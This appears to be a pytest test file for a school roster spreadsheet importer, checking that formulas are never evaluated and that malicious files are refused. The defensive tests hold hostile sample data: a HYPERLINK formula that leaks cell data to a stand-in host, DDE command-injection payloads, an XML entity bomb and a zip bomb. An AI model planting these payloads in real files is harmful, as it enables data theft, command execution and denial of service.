"""Reading spreadsheets safely (FR-IMP-001, SEC-017, docs/07 §10: formulas never evaluated).

Pure tests: no database. Synthetic content only.
"""

from __future__ import annotations

import io
import sys
import zipfile
from typing import Any

import openpyxl.xml
import pytest
from openpyxl import Workbook

from app.imports.config import import_config
from app.imports.sheet import Cell, SheetError, looks_like_formula, read_sheet

S = sys.modules["sos_test_imports_support"]
LIMITS = import_config().limits
HYPERLINK = '=HYPERLINK("https://evil.example/?x="&B2,"Click")'
DDE = "=cmd|' /C calc'!A0"


def _values(sheet: Any) -> list[list[Any]]:
    return [[c.value for c in r.cells] for r in sheet.rows]


def test_FR_IMP_001_xlsx_header_detected_after_title_rows() -> None:
    data = S.xlsx_bytes(
        [
            ["Synthetic Model School"],
            ["Class list 2026-27"],
            [],
            ["Adm No", "Name of the Student", "DOB"],
            ["A-1", "Synthetica One", "01/02/2012"],
            [],
            ["A-2", "Synthetica Two", "03/04/2012"],
        ]
    )
    sheet = read_sheet(data, "xlsx", LIMITS)
    assert sheet.header_row == 4
    assert sheet.headers == ("Adm No", "Name of the Student", "DOB")
    assert [r.row_no for r in sheet.rows] == [5, 7]  # empty rows skipped, numbers as shown
    assert _values(sheet)[0] == ["A-1", "Synthetica One", "01/02/2012"]


def test_SEC_017_formula_cells_are_never_evaluated_but_kept_as_inert_text() -> None:
    wb = Workbook()
    ws = wb.active
    assert ws is not None
    ws.append(["Adm No", "Name of the Student", "Section"])
    ws.append(["A-1", HYPERLINK, "A"])
    ws.append(["A-2", DDE, "=1+1"])
    ws.append(["A-3", "Synthetica Plain", "=SUM(1,2)"])
    buf = io.BytesIO()
    wb.save(buf)
    sheet = read_sheet(buf.getvalue(), "xlsx", LIMITS)
    cells = [r.cells for r in sheet.rows]
    assert cells[0][1] == Cell(HYPERLINK, True)
    assert cells[1][1] == Cell(DDE, True)
    assert cells[1][2] == Cell("=1+1", True)  # never 2
    assert cells[2][2].value == "=SUM(1,2)" and cells[2][2].formula
    assert cells[2][1] == Cell("Synthetica Plain", False)
    assert sheet.formula_cells == 4


def test_SEC_017_cached_formula_results_are_ignored() -> None:
    """A workbook saved by Excel carries cached results; data_only=False never reads them."""
    raw = S.xlsx_bytes([["Adm No", "Name", "Class"], ["A-1", "=1+1", "IX"]])
    src = zipfile.ZipFile(io.BytesIO(raw))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            body = src.read(info.filename)
            if info.filename == "xl/worksheets/sheet1.xml":
                assert b"<f>1+1</f><v />" in body
                body = body.replace(b"<f>1+1</f><v />", b"<f>1+1</f><v>Cached Name</v>")
            dst.writestr(info, body)
    sheet = read_sheet(out.getvalue(), "xlsx", LIMITS)
    assert sheet.rows[0].cells[1] == Cell("=1+1", True)


@pytest.mark.parametrize(
    ("text", "formula"),
    [
        ("=A1", True),
        (" =1+1", True),
        ("@SUM(A1)", True),
        ("+cmd|' /C calc'!A0", True),
        ("-2+3+cmd|' /C calc'!A0", True),
        ("+91 98765 43210", False),
        ("-12", False),
        ("Synthetica", False),
        ("A-1", False),
        ("", False),
    ],
)
def test_SEC_017_formula_like_text(text: str, formula: bool) -> None:
    assert looks_like_formula(text) is formula


def test_SEC_017_csv_formula_payloads_stay_text_and_are_flagged() -> None:
    data = S.csv_bytes([["Adm No", "Name of the Student", "Class"], ["A-1", DDE, "IX"]])
    sheet = read_sheet(data, "csv", LIMITS)
    assert sheet.rows[0].cells[1] == Cell(DDE, True)
    assert sheet.formula_cells == 1


def test_FR_IMP_001_openpyxl_parses_xml_through_defusedxml() -> None:
    assert openpyxl.xml.DEFUSEDXML is True


def _with_entity_bomb(raw: bytes) -> bytes:
    src = zipfile.ZipFile(io.BytesIO(raw))
    out = io.BytesIO()
    lol = (
        b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>'
    )
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            body = src.read(info.filename)
            if info.filename == "xl/worksheets/sheet1.xml":
                if body.startswith(b"<?xml"):
                    body = body.split(b"?>", 1)[1]
                body = lol + body.replace(b"</sheetData>", b"</sheetData><!-- &lol2; -->", 1)
            dst.writestr(info, body)
    return out.getvalue()


def test_FR_IMP_001_entity_expansion_is_refused() -> None:
    raw = S.xlsx_bytes([["Adm No", "Name", "Class"], ["A-1", "Synthetica", "IX"]])
    with pytest.raises(SheetError) as err:
        read_sheet(_with_entity_bomb(raw), "xlsx", LIMITS)
    assert err.value.code == "file_unreadable"
    chain: list[str] = []
    exc: BaseException | None = err.value
    while exc is not None:
        chain.append(type(exc).__name__)
        exc = exc.__cause__ or exc.__context__
    assert "EntitiesForbidden" in chain  # refused by defusedxml, not by accident


def test_FR_IMP_001_zip_bomb_is_refused_before_parsing() -> None:
    raw = S.xlsx_bytes([["Adm No", "Name", "Class"], ["A-1", "Synthetica", "IX"]])
    src = zipfile.ZipFile(io.BytesIO(raw))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            dst.writestr(info, src.read(info.filename))
        dst.writestr("xl/media/padding.bin", b"\0" * (30 * 1024 * 1024))  # ~30 KB compressed
    assert len(out.getvalue()) < 1024 * 1024
    with pytest.raises(SheetError) as err:
        read_sheet(out.getvalue(), "xlsx", LIMITS)
    assert err.value.code == "file_too_complex"


def test_FR_IMP_001_oversize_file_is_refused() -> None:
    with pytest.raises(SheetError) as err:
        read_sheet(b"x" * (LIMITS.max_file_bytes + 1), "csv", LIMITS)
    assert err.value.code == "file_too_large"


def test_FR_IMP_001_not_a_spreadsheet() -> None:
    with pytest.raises(SheetError) as err:
        read_sheet(b"PK\x03\x04 not really a zip", "xlsx", LIMITS)
    assert err.value.code == "file_unreadable"


def test_FR_IMP_001_row_and_column_limits() -> None:
    too_wide = [[f"H{i}" for i in range(LIMITS.max_columns + 1)], ["x"] * (LIMITS.max_columns + 1)]
    with pytest.raises(SheetError) as err:
        read_sheet(S.csv_bytes(too_wide), "csv", LIMITS)
    assert err.value.code == "too_many_columns"
    rows = [["Adm No", "Name", "Class"]] + [
        [f"A{i}", "N", "IX"] for i in range(LIMITS.max_rows + 1)
    ]
    with pytest.raises(SheetError) as err:
        read_sheet(S.csv_bytes(rows), "csv", LIMITS)
    assert err.value.code == "too_many_rows"


def test_FR_IMP_001_header_must_be_near_the_top() -> None:
    rows: list[list[Any]] = [["x"]] * 12 + [["Adm No", "Name", "Class"], ["A", "B", "C"]]
    with pytest.raises(SheetError) as err:
        read_sheet(S.csv_bytes(rows), "csv", LIMITS)
    assert err.value.code == "header_not_found"
    with pytest.raises(SheetError) as err:
        read_sheet(S.csv_bytes([["Adm No", "Name", "Class"]]), "csv", LIMITS)
    assert err.value.code == "no_data_rows"


@pytest.mark.parametrize("delimiter", [",", ";", "\t", "|"])
def test_FR_IMP_001_csv_delimiters_and_bom(delimiter: str) -> None:
    rows = [["Adm No", "విద్యార్థి పేరు", "Class"], ["A-1", "కృత్రిమ విద్యార్థి", "IX"]]
    sheet = read_sheet(S.csv_bytes(rows, delimiter=delimiter, bom=True), "csv", LIMITS)
    assert sheet.headers == ("Adm No", "విద్యార్థి పేరు", "Class")
    assert _values(sheet) == [["A-1", "కృత్రిమ విద్యార్థి", "IX"]]


def test_FR_IMP_001_csv_must_be_utf8() -> None:
    with pytest.raises(SheetError) as err:
        read_sheet("Adm No,Name,Class\nA,Ã©,IX\n".encode("utf-16"), "csv", LIMITS)
    assert err.value.code in {"not_utf8", "file_unreadable"}


def test_FR_IMP_001_google_sheets_csv_export() -> None:
    """Google Sheets exports: comma, CRLF, quoted cells with commas and newlines."""
    data = (
        'Adm No,Name of the Student,Address\r\n"A-1","Synthetica, Venkata","Line 1\r\nLine 2"\r\n'
    ).encode()
    sheet = read_sheet(data, "csv", LIMITS)
    assert _values(sheet) == [["A-1", "Synthetica, Venkata", "Line 1\r\nLine 2"]]


def test_FR_IMP_001_xlsx_dates_and_numbers_keep_their_type() -> None:
    import datetime as dt

    data = S.xlsx_bytes([["Adm No", "Name", "DOB"], [1001, "Synthetica", dt.datetime(2012, 3, 14)]])
    sheet = read_sheet(data, "xlsx", LIMITS)
    adm_no, _, dob = sheet.rows[0].cells
    assert adm_no.value == 1001
    assert dob.value == dt.datetime(2012, 3, 14)
